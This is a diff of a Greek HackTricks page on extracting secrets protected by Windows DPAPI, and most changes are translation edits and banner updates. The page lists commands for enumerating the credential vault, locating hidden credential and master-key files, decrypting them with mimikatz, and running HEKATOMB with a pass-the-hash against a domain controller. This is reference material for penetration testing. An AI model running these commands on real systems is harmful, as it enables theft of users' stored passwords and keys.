@@ -1,40 +1,41 @@
-# DPAPI - Εξαγωγή Κωδικών Πρόσβασης
+# DPAPI - Εξαγωγή Κωδικών
+
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σημαντικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωντανός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.
+​​[**RootedCON**](https://www.rootedcon.com/) είναι η πιο σχετική εκδήλωση κυβερνοασφάλειας στην **Ισπανία** και μία από τις πιο σημαντικές στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένα καυτό σημείο συνάντησης για επαγγελματίες της τεχνολογίας και της κυβερνοασφάλειας σε κάθε τομέα.
 
 {% embed url="https://www.rootedcon.com/" %}
 
-
 ## Τι είναι το DPAPI
 
-Το Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, εκμεταλλευόμενο είτε τα μυστικά του χρήστη είτε τα μυστικά του συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα μυστικά σύνδεσης του χρήστη ή, για την κρυπτογράφηση του συστήματος, τα μυστικά ελέγχου τομέα του συστήματος, απαλλάσσοντας έτσι τους προγραμματιστές από την ανάγκη να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης.
+Η API Προστασίας Δεδομένων (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για **συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών**, εκμεταλλευόμενη είτε μυστικά χρήστη είτε συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές, επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα μυστικά σύνδεσης του χρήστη ή, για την κρυπτογράφηση του συστήματος, τα μυστικά αυθεντικοποίησης του τομέα του συστήματος, αποφεύγοντας έτσι την ανάγκη οι προγραμματιστές να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης οι ίδιοι.
 
-### Δεδομένα που προστατεύονται από το DPAPI
+### Προστατευμένα Δεδομένα από το DPAPI
 
-Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI περιλαμβάνονται:
+Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI είναι:
 
-- Οι κωδικοί πρόσβασης του Internet Explorer και του Google Chrome και τα δεδομένα αυτόματης συμπλήρωσης
-- Οι κωδικοί πρόσβασης για τα email και τους εσωτερικούς λογαριασμούς FTP για εφαρμογές όπως το Outlook και το Windows Mail
-- Οι κωδικοί πρόσβασης για κοινόχρηστους φακέλους, πόρους, ασύρματα δίκτυα και το Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
-- Οι κωδικοί πρόσβασης για συνδέσεις απομακρυσμένης επιφάνειας εργασίας, το .NET Passport και τα ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και πιστοποίησης
-- Οι κωδικοί πρόσβασης δικτύου που διαχειρίζεται ο Διαχειριστής Πιστοποιητικών και τα προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν τη CryptProtectData, όπως το Skype, το MSN Messenger και άλλα
+* Κωδικοί πρόσβασης και δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
+* Κωδικοί πρόσβασης email και εσωτερικών λογαριασμών FTP για εφαρμογές όπως το Outlook και το Windows Mail
+* Κωδικοί πρόσβασης για κοινόχρηστα φακέλους, πόρους, ασύρματα δίκτυα και Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
+* Κωδικοί πρόσβασης για απομακρυσμένες συνδέσεις επιφάνειας εργασίας, .NET Passport και ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και αυθεντικοποίησης
+* Κωδικοί πρόσβασης δικτύου που διαχειρίζεται ο Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν το CryptProtectData, όπως το Skype, το MSN messenger και άλλα
 
-
-## Λίστα Θησαυροφυλακίου
+## Λίστα Vault
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -42,16 +43,16 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
-## Αρχεία διαπιστευτηρίων
+## Credential Files
 
-Τα **αρχεία διαπιστευτηρίων που προστατεύονται** μπορεί να βρίσκονται στις εξής τοποθεσίες:
+Τα **αρχεία διαπιστευτηρίων που προστατεύονται** θα μπορούσαν να βρίσκονται σε:
 ```
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-Αποκτήστε πληροφορίες διαπιστευτήριων χρησιμοποιώντας το mimikatz `dpapi::cred`, στην απόκριση μπορείτε να βρείτε ενδιαφέρουσες πληροφορίες, όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.
+Αποκτήστε πληροφορίες πιστοποίησης χρησιμοποιώντας το mimikatz `dpapi::cred`, στην απάντηση μπορείτε να βρείτε ενδιαφέρουσες πληροφορίες όπως τα κρυπτογραφημένα δεδομένα και το guidMasterKey.
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -65,9 +66,9 @@ pbData             : b8f619[...snip...]b493fe
 ```
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 ```
-## Κλειδιά Master
+## Master Keys
 
-Τα κλειδιά DPAPI που χρησιμοποιούνται για την κρυπτογράφηση των RSA κλειδιών του χρήστη αποθηκεύονται στον φάκελο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το {SID} είναι το [**Αναγνωριστικό Ασφαλείας**](https://en.wikipedia.org/wiki/Security\_Identifier) **του συγκεκριμένου χρήστη**. **Το κλειδί DPAPI αποθηκεύεται στον ίδιο αρχείο με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη**. Συνήθως είναι 64 bytes τυχαίων δεδομένων. (Παρατηρήστε ότι αυτός ο φάκελος είναι προστατευμένος, οπότε δεν μπορείτε να τον εμφανίσετε χρησιμοποιώντας την εντολή `dir` από το cmd, αλλά μπορείτε να τον εμφανίσετε από το PS).
+Οι κλειδιά DPAPI που χρησιμοποιούνται για την κρυπτογράφηση των RSA κλειδιών του χρήστη αποθηκεύονται στον φάκελο `%APPDATA%\Microsoft\Protect\{SID}`, όπου {SID} είναι ο [**Security Identifier**](https://en.wikipedia.org/wiki/Security\_Identifier) **αυτού του χρήστη**. **Το κλειδί DPAPI αποθηκεύεται στο ίδιο αρχείο με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά των χρηστών**. Συνήθως είναι 64 bytes τυχαίων δεδομένων. (Σημειώστε ότι αυτός ο φάκελος είναι προστατευμένος, οπότε δεν μπορείτε να τον καταχωρίσετε χρησιμοποιώντας `dir` από το cmd, αλλά μπορείτε να τον καταχωρίσετε από το PS).
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -78,31 +79,31 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
 Αυτό είναι πώς θα φαίνονται μια σειρά από Master Keys ενός χρήστη:
 
-![](<../../.gitbook/assets/image (324).png>)
+![](<../../.gitbook/assets/image (1121).png>)
 
-Συνήθως, **κάθε Master Key είναι ένα κρυπτογραφημένο συμμετρικό κλειδί που μπορεί να αποκρυπτογραφήσει άλλο περιεχόμενο**. Επομένως, είναι ενδιαφέρον να **εξάγουμε** το **κρυπτογραφημένο Master Key** για να το **αποκρυπτογραφήσουμε** αργότερα το **άλλο περιεχόμενο** που έχει κρυπτογραφηθεί με αυτό.
+Συνήθως **κάθε master key είναι ένα κρυπτογραφημένο συμμετρικό κλειδί που μπορεί να αποκρυπτογραφήσει άλλο περιεχόμενο**. Επομένως, **η εξαγωγή** του **κρυπτογραφημένου Master Key** είναι ενδιαφέρουσα προκειμένου να **αποκρυπτογραφήσουμε** αργότερα εκείνο το **άλλο περιεχόμενο** που έχει κρυπτογραφηθεί με αυτό.
 
-### Εξαγωγή Master Key & αποκρυπτογράφηση
+### Εξαγωγή master key & αποκρυπτογράφηση
 
-Ελέγξτε την ανάρτηση [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) για ένα παράδειγμα πώς να εξάγετε το master key και να το αποκρυπτογραφήσετε.
+Ελέγξτε την ανάρτηση [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) για ένα παράδειγμα σχετικά με το πώς να εξαγάγετε το master key και να το αποκρυπτογραφήσετε.
 
 ## SharpDPAPI
 
-Το [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) είναι μια μεταφορά της λειτουργικότητας του DPAPI από το έργο Mimikatz του [@gentilkiwi](https://twitter.com/gentilkiwi).
+[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) είναι μια C# μεταφορά κάποιων λειτουργιών DPAPI από το [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) έργο.
 
 ## HEKATOMB
 
-Το [**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον κατάλογο LDAP και την εξαγωγή του κλειδιού αντιγράφου ασφαλείας του ελεγκτή του τομέα μέσω του RPC. Στη συνέχεια, το σενάριο θα επιλύσει τη διεύθυνση IP όλων των υπολογιστών και θα εκτελέσει ένα smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το κλειδί αντιγράφου ασφαλείας του τομέα.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον κατάλογο LDAP και την εξαγωγή του κλειδιού αντιγράφου ασφαλείας του ελεγκτή τομέα μέσω RPC. Το σενάριο θα επιλύσει στη συνέχεια τη διεύθυνση IP όλων των υπολογιστών και θα εκτελέσει smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το κλειδί αντιγράφου ασφαλείας του τομέα.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Με τη λίστα υπολογιστών που εξάγονται από τον κατάλογο LDAP, μπορείτε να βρείτε κάθε υποδίκτυο ακόμα κι αν δεν τα γνωρίζατε!
+Με τη λίστα υπολογιστών που εξήχθη από το LDAP μπορείτε να βρείτε κάθε υποδίκτυο ακόμη και αν δεν τα γνωρίζατε!
 
-"Επειδή οι δικαιώματα του Domain Admin δεν είναι αρκετά. Χακάρετε τους όλους."
+"Επειδή τα δικαιώματα Domain Admin δεν είναι αρκετά. Χακάρετε τα όλα."
 
 ## DonPAPI
 
-Το [**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να αποκτήσει αυτόματα μυστικά που προστατεύονται από το DPAPI.
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να εξάγει μυστικά που προστατεύονται από DPAPI αυτόματα.
 
 ## Αναφορές
 
@@ -111,18 +112,21 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/) είναι το πιο σχετικό συνέδριο κυβερνοασφάλειας στην **Ισπανία** και ένα από τα πιο σημαντικά στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένας ζωντανός σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε ειδικότητα.
+[**RootedCON**](https://www.rootedcon.com/) είναι η πιο σχετική εκδήλωση κυβερνοασφάλειας στην **Ισπανία** και μία από τις πιο σημαντικές στην **Ευρώπη**. Με **αποστολή την προώθηση της τεχνικής γνώσης**, αυτό το συνέδριο είναι ένα καυτό σημείο συνάντησης για επαγγελματίες τεχνολογίας και κυβερνοασφάλειας σε κάθε πειθαρχία.
 
 {% embed url="https://www.rootedcon.com/" %}
 
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
